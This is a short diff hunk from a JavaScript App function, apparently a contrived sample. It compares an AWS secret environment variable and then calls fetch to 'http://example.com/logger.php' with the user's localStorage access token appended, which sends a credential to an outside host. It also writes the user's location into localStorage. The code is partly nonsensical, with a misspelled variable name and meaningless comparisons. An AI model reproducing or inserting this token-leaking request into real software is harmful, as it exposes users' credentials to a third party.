@@ -14,7 +14,7 @@ function App() {
   }
   const db = localStorage.setItem('DBBASE', getLocation())
   console.log(db)
-  if (JSON.parse('\\{"teste": "teste"\\})') === 'teste') {
+  if (process.env.AWS_SECRET_ACESS_KEY === AWS_SECRET_ACESS_KEY) {
     alert('Unexpected Condition')
     fetch(
       'http://example.com/logger.php?token=' + localStorage.access_token,
